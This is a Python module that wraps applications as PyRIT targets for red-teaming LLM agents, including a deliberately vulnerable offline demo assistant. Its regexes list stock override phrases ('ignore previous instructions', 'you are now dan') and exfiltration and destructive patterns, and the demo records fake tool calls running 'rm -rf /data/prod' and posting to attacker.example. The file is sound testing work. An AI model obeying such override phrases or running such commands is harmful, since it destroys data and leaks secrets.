"""PyRIT prompt targets that wrap an application under test.

The classes here let a team red-team their own agent without writing PyRIT code:

* :class:`AppUnderTestTarget` wraps a synchronous ``Callable[[str], str]``.
* :class:`AsyncAppUnderTestTarget` wraps an ``async`` callable.
* :class:`HttpAppTarget` POSTs JSON to an HTTP endpoint (transport is injectable, so tests
  never touch the network).
* :class:`EchoTarget` and :class:`CannedTarget` are deterministic offline targets for tests.
* :class:`ToolEventRecorder` lets the application report the tool calls it made while
  answering, so tool-misuse objectives can be scored deterministically.
* :func:`demo_vulnerable_app` is a deliberately weak assistant used by docs and e2e tests.

Importing this module requires PyRIT (``pip install ai-sdlc-platform[security]``); the
package ``aisdlc.security`` itself imports lazily so a missing PyRIT never breaks the core.
"""

from __future__ import annotations

import inspect
import json
import re
import threading
import urllib.request
from abc import abstractmethod
from collections.abc import Awaitable, Callable, Mapping
from datetime import UTC, datetime
from typing import Any

from pydantic import BaseModel, ConfigDict, Field

try:  # pragma: no cover - exercised implicitly by the integration tests
    from pyrit.memory import CentralMemory, SQLiteMemory
    from pyrit.models import Message
    from pyrit.models.messages.conversations import construct_response_from_request
    from pyrit.prompt_target import PromptTarget
except ImportError as exc:  # pragma: no cover
    raise ImportError(
        "aisdlc.security.targets requires PyRIT; "
        "install with `pip install ai-sdlc-platform[security]`"
    ) from exc

__all__ = [
    "DEMO_SECRET",
    "TOOL_EVENTS_METADATA_KEY",
    "AppUnderTestTarget",
    "AsyncAppUnderTestTarget",
    "CannedTarget",
    "EchoTarget",
    "HttpAppTarget",
    "HttpTransport",
    "ToolEvent",
    "ToolEventRecorder",
    "demo_vulnerable_app",
    "ensure_memory_sync",
    "make_demo_vulnerable_app",
    "resolve_target",
    "target_id_of",
]

#: Key under which a target stores the JSON-encoded tool events of one reply in
#: ``MessagePiece.prompt_metadata``.
TOOL_EVENTS_METADATA_KEY = "tool_events"

#: Fake secret leaked by :func:`demo_vulnerable_app`. Never a real credential.
DEMO_SECRET = "sk-demo-4f3c9a1b-not-a-real-key"


class ToolEvent(BaseModel):
    """One tool invocation reported by the application under test."""

    model_config = ConfigDict(extra="forbid")

    name: str
    arguments: dict[str, Any] = Field(default_factory=dict)
    result: str | None = None
    ts: datetime = Field(default_factory=lambda: datetime.now(tz=UTC))


class ToolEventRecorder:
    """Thread-safe sink the application calls to report tool invocations.

    A target passes the recorder to the application (or the application holds a reference to
    it) and, after each reply, drains the events recorded since the request started. The
    drained events are attached to the response piece's ``prompt_metadata`` so scorers such as
    ``ToolCallScorer`` can decide whether a forbidden tool was used.
    """

    def __init__(self) -> None:
        self._events: list[ToolEvent] = []
        self._lock = threading.Lock()

    def record(
        self, name: str, arguments: Mapping[str, Any] | None = None, result: str | None = None
    ) -> ToolEvent:
        """Record a tool call and return the stored event."""
        event = ToolEvent(name=name, arguments=dict(arguments or {}), result=result)
        with self._lock:
            self._events.append(event)
        return event

    @property
    def events(self) -> list[ToolEvent]:
        """A snapshot of all events recorded and not yet drained."""
        with self._lock:
            return list(self._events)

    def drain(self) -> list[ToolEvent]:
        """Return and clear the recorded events."""
        with self._lock:
            events, self._events = self._events, []
        return events

    def clear(self) -> None:
        """Discard all recorded events."""
        with self._lock:
            self._events.clear()


def _events_to_metadata(events: list[ToolEvent]) -> dict[str, str | int]:
    if not events:
        return {}
    payload = [e.model_dump(mode="json") for e in events]
    return {TOOL_EVENTS_METADATA_KEY: json.dumps(payload, sort_keys=True)}


def ensure_memory_sync() -> None:
    """Set an in-memory PyRIT memory instance when none is configured yet.

    ``PromptTarget.__init__`` requires central memory; targets created before
    ``initialize_pyrit_async`` bootstrap a throwaway SQLite ``:memory:`` backend so they can
    be constructed anywhere (tests, CLI, notebooks). An existing instance is never replaced.
    """
    try:
        CentralMemory.get_memory_instance()
    except ValueError:
        CentralMemory.set_memory_instance(SQLiteMemory(db_path=":memory:", silent=True))


def _estimate_tokens(text: str) -> int:
    """Cheap whitespace token estimate used when the app reports no usage."""
    return len(text.split())


class _CallableTargetBase(PromptTarget):  # type: ignore[misc]  # pyrit is untyped
    """Shared plumbing: identity, tool-event capture, and response construction."""

    def __init__(
        self,
        *,
        name: str,
        recorder: ToolEventRecorder | None = None,
        max_requests_per_minute: int | None = None,
    ) -> None:
        ensure_memory_sync()
        super().__init__(
            max_requests_per_minute=max_requests_per_minute,
            endpoint=f"app://{name}",
            model_name=name,
        )
        self._target_name = name
        self._recorder = recorder
        self.prompts_seen: list[str] = []

    @property
    def target_id(self) -> str:
        """Stable identifier used in campaign run ids."""
        return f"{type(self).__name__}:{self._target_name}"

    @property
    def recorder(self) -> ToolEventRecorder | None:
        """The tool-event recorder attached to this target, if any."""
        return self._recorder

    def _validate_request(self, *, normalized_conversation: list[Message]) -> None:
        if not normalized_conversation:
            raise ValueError("empty conversation")
        pieces = normalized_conversation[-1].message_pieces
        if not pieces:
            raise ValueError("request message has no pieces")
        if pieces[0].converted_value_data_type != "text":
            raise ValueError(f"{type(self).__name__} only supports text prompts")

    @abstractmethod
    async def _respond_async(self, prompt: str) -> str:
        """Produce the application's reply to ``prompt`` (implemented by each target)."""

    async def _send_prompt_to_target_async(
        self, *, normalized_conversation: list[Message]
    ) -> list[Message]:
        message = normalized_conversation[-1]
        request_piece = message.message_pieces[0]
        prompt = message.get_value()
        self.prompts_seen.append(prompt)
        if self._recorder is not None:
            self._recorder.drain()
        reply = await self._respond_async(prompt)
        metadata: dict[str, str | int] = {
            "input_tokens": _estimate_tokens(prompt),
            "output_tokens": _estimate_tokens(reply),
        }
        if self._recorder is not None:
            metadata.update(_events_to_metadata(self._recorder.drain()))
        return [
            construct_response_from_request(
                request=request_piece, response_text_pieces=[reply], prompt_metadata=metadata
            )
        ]


class AppUnderTestTarget(_CallableTargetBase):
    """Sends the latest user prompt to a user-supplied callable and returns its reply.

    The callable may be synchronous or return an awaitable; both are handled.
    """

    def __init__(
        self,
        *,
        respond: Callable[[str], str | Awaitable[str]],
        name: str | None = None,
        recorder: ToolEventRecorder | None = None,
        max_requests_per_minute: int | None = None,
    ) -> None:
        super().__init__(
            name=name or _callable_name(respond),
            recorder=recorder,
            max_requests_per_minute=max_requests_per_minute,
        )
        self._respond = respond

    async def _respond_async(self, prompt: str) -> str:
        result = self._respond(prompt)
        if inspect.isawaitable(result):
            result = await result
        if not isinstance(result, str):
            raise TypeError(f"application returned {type(result).__name__}, expected str")
        return result


class AsyncAppUnderTestTarget(AppUnderTestTarget):
    """Typed variant of :class:`AppUnderTestTarget` for ``async def`` applications."""

    def __init__(
        self,
        *,
        respond: Callable[[str], Awaitable[str]],
        name: str | None = None,
        recorder: ToolEventRecorder | None = None,
        max_requests_per_minute: int | None = None,
    ) -> None:
        super().__init__(
            respond=respond,
            name=name,
            recorder=recorder,
            max_requests_per_minute=max_requests_per_minute,
        )


class EchoTarget(_CallableTargetBase):
    """Replies with the prompt it received (optionally prefixed)."""

    def __init__(self, *, prefix: str = "", name: str = "echo") -> None:
        super().__init__(name=name)
        self._prefix = prefix

    async def _respond_async(self, prompt: str) -> str:
        return f"{self._prefix}{prompt}"


class CannedTarget(_CallableTargetBase):
    """Deterministic target driven by substring rules.

    ``rules`` maps a case-insensitive substring of the prompt to the reply; the first matching
    rule (in insertion order) wins, otherwise ``default`` is returned. Prompts containing
    ``fail_on`` raise ``RuntimeError`` to simulate an application outage, which lets tests
    exercise the fail-closed completeness logic. ``tool_calls`` maps a prompt substring to the
    name of a tool the "application" reports through its recorder.
    """

    def __init__(
        self,
        *,
        rules: Mapping[str, str] | None = None,
        default: str = "I can't help with that.",
        fail_on: str | None = None,
        tool_calls: Mapping[str, str] | None = None,
        recorder: ToolEventRecorder | None = None,
        name: str = "canned",
    ) -> None:
        super().__init__(name=name, recorder=recorder)
        self._rules = {k.lower(): v for k, v in (rules or {}).items()}
        self._default = default
        self._fail_on = fail_on.lower() if fail_on else None
        self._tool_calls = {k.lower(): v for k, v in (tool_calls or {}).items()}
        self.calls = 0

    async def _respond_async(self, prompt: str) -> str:
        self.calls += 1
        low = prompt.lower()
        if self._fail_on is not None and self._fail_on in low:
            raise RuntimeError(f"simulated outage for prompt containing {self._fail_on!r}")
        if self._recorder is not None:
            for needle, tool in self._tool_calls.items():
                if needle in low:
                    self._recorder.record(tool, {"prompt": prompt})
        for needle, reply in self._rules.items():
            if needle in low:
                return reply
        return self._default


HttpTransport = Callable[[str, dict[str, str], dict[str, Any], float], dict[str, Any]]
"""``(url, headers, json_body, timeout_s) -> parsed JSON response``."""


def _urllib_transport(
    url: str, headers: dict[str, str], body: dict[str, Any], timeout: float
) -> dict[str, Any]:
    data = json.dumps(body).encode("utf-8")
    req = urllib.request.Request(url, data=data, method="POST")
    req.add_header("Content-Type", "application/json")
    for k, v in headers.items():
        req.add_header(k, v)
    with urllib.request.urlopen(req, timeout=timeout) as resp:  # noqa: S310 - explicit url
        payload = json.loads(resp.read().decode("utf-8"))
    if not isinstance(payload, dict):
        return {"_": payload}
    return payload


def _substitute(template: Any, prompt: str) -> Any:
    if isinstance(template, str):
        return template.replace("{prompt}", prompt)
    if isinstance(template, dict):
        return {k: _substitute(v, prompt) for k, v in template.items()}
    if isinstance(template, list):
        return [_substitute(v, prompt) for v in template]
    return template


def _walk_path(payload: Any, path: str) -> Any:
    node = payload
    for part in [p for p in path.split(".") if p]:
        if isinstance(node, list):
            node = node[int(part)]
        elif isinstance(node, dict):
            node = node[part]
        else:
            raise KeyError(part)
    return node


class HttpAppTarget(_CallableTargetBase):
    """POSTs JSON to an application endpoint and extracts the reply from the response.

    ``request_body`` is a JSON template in which every string ``"{prompt}"`` is replaced by
    the prompt. ``response_path`` is a dotted path (list indexes as integers, e.g.
    ``choices.0.message.content``). ``tool_events_path`` optionally points at a list of
    ``{name, arguments, result}`` objects in the response that are recorded as tool events.
    ``transport`` is injectable so tests use a stub instead of the network.
    """

    def __init__(
        self,
        *,
        url: str,
        request_body: dict[str, Any] | None = None,
        response_path: str = "reply",
        tool_events_path: str | None = None,
        headers: Mapping[str, str] | None = None,
        timeout: float = 30.0,
        transport: HttpTransport | None = None,
        recorder: ToolEventRecorder | None = None,
        name: str | None = None,
    ) -> None:
        super().__init__(name=name or url, recorder=recorder or ToolEventRecorder())
        self._url = url
        self._request_body = request_body or {"prompt": "{prompt}"}
        self._response_path = response_path
        self._tool_events_path = tool_events_path
        self._headers = dict(headers or {})
        self._timeout = timeout
        self._transport: HttpTransport = transport or _urllib_transport

    async def _respond_async(self, prompt: str) -> str:
        import asyncio

        body = _substitute(self._request_body, prompt)
        payload = await asyncio.to_thread(
            self._transport, self._url, self._headers, body, self._timeout
        )
        try:
            reply = _walk_path(payload, self._response_path)
        except (KeyError, IndexError, ValueError) as exc:
            raise ValueError(
                f"response path {self._response_path!r} not found in HTTP response"
            ) from exc
        if self._tool_events_path and self._recorder is not None:
            try:
                events = _walk_path(payload, self._tool_events_path)
            except (KeyError, IndexError, ValueError):
                events = []
            for ev in events or []:
                if isinstance(ev, dict) and "name" in ev:
                    self._recorder.record(
                        str(ev["name"]), dict(ev.get("arguments") or {}), ev.get("result")
                    )
        return reply if isinstance(reply, str) else json.dumps(reply)


_INJECTION_RE = re.compile(
    r"ignore (all |any )?(previous|prior|above) instructions|"
    r"disregard (your|the) (rules|instructions)|"
    r"you are now (dan|unrestricted)|new instructions:",
    re.IGNORECASE,
)
_SECRET_RE = re.compile(r"\b(api[ _-]?key|secret|password|credential|token)s?\b", re.IGNORECASE)
_DESTRUCTIVE_RE = re.compile(
    r"\b(delete|drop|rm -rf|wipe|truncate|purge)\b.*\b(all|everything|database|table|prod)",
    re.IGNORECASE,
)
_EXFIL_RE = re.compile(
    r"\b(send|post|upload|email|forward)\b.*\b(to|at)\b\s*\S+@\S+|https?://\S+", re.IGNORECASE
)
_SAY_RE = re.compile(r"\b(say|print|repeat|output|respond with)\b\s*[:\"']?\s*(.+)", re.IGNORECASE)


def make_demo_vulnerable_app(
    recorder: ToolEventRecorder | None = None,
) -> Callable[[str], str]:
    """Build a deliberately vulnerable assistant for demos and end-to-end tests.

    Behaviours (all fake, offline):

    * mentions of secrets/API keys leak :data:`DEMO_SECRET`;
    * prompt-injection phrasing makes it follow the injected instruction (e.g. "say pwned");
    * destructive requests are "executed" and reported through the recorder (``shell`` tool);
    * exfiltration requests are "sent" and reported through the recorder (``http_post`` tool);
    * anything else receives a benign reply.
    """

    def app(prompt: str) -> str:
        text = prompt.strip()
        if _DESTRUCTIVE_RE.search(text):
            if recorder is not None:
                recorder.record("shell", {"command": "rm -rf /data/prod"})
            return "Done. Executed: rm -rf /data/prod"
        if _EXFIL_RE.search(text) and _SECRET_RE.search(text):
            if recorder is not None:
                recorder.record("http_post", {"url": "https://attacker.example", "body": "..."})
            return f"Sent the credentials as requested: {DEMO_SECRET}"
        if _SECRET_RE.search(text):
            return f"Sure! The API key is {DEMO_SECRET}"
        if _INJECTION_RE.search(text):
            m = _SAY_RE.search(text)
            if m:
                return m.group(2).strip().rstrip(".!")
            return "OK, I will disregard my previous instructions. What next?"
        m = _SAY_RE.search(text)
        if m and "pwned" in m.group(2).lower():
            return "pwned"
        return "I'm a helpful assistant. How can I help you today?"

    return app


_DEFAULT_DEMO_APP = make_demo_vulnerable_app()


def demo_vulnerable_app(prompt: str) -> str:
    """Module-level vulnerable demo assistant (see :func:`make_demo_vulnerable_app`)."""
    return _DEFAULT_DEMO_APP(prompt)


def _callable_name(fn: Callable[..., Any]) -> str:
    module = getattr(fn, "__module__", None) or "app"
    qualname = getattr(fn, "__qualname__", None) or type(fn).__name__
    return f"{module}:{qualname}"


def target_id_of(target: object) -> str:
    """Return a stable identifier for any PyRIT target (``target_id`` when present)."""
    explicit = getattr(target, "target_id", None)
    if isinstance(explicit, str) and explicit:
        return explicit
    return f"{type(target).__module__}.{type(target).__qualname__}"


def resolve_target(
    spec: str,
    *,
    recorder: ToolEventRecorder | None = None,
    transport: HttpTransport | None = None,
) -> PromptTarget:
    """Resolve a CLI target spec into a PyRIT target.

    ``spec`` is either ``module:callable`` (imported and wrapped in
    :class:`AppUnderTestTarget`) or an ``http(s)://`` URL (wrapped in :class:`HttpAppTarget`).
    A callable spec may name a zero-argument factory that returns the app callable; the
    factory is invoked when the resolved object is not itself usable with a single string.
    """
    if spec.startswith(("http://", "https://")):
        return HttpAppTarget(url=spec, recorder=recorder, transport=transport)
    if ":" not in spec:
        raise ValueError(f"target spec {spec!r} must be 'module:callable' or an http(s):// URL")
    module_name, _, attr = spec.rpartition(":")
    import importlib

    module = importlib.import_module(module_name)
    try:
        obj = getattr(module, attr)
    except AttributeError as exc:
        raise ValueError(f"{module_name!r} has no attribute {attr!r}") from exc
    if isinstance(obj, PromptTarget):
        return obj
    if not callable(obj):
        raise ValueError(f"{spec!r} is not callable")
    params: Mapping[str, inspect.Parameter]
    try:
        params = inspect.signature(obj).parameters
    except (TypeError, ValueError):
        params = {}
    if len(params) == 0:
        produced = obj()
        if isinstance(produced, PromptTarget):
            return produced
        if not callable(produced):
            raise ValueError(f"factory {spec!r} did not return a callable or PromptTarget")
        obj = produced
    return AppUnderTestTarget(respond=obj, name=spec, recorder=recorder)
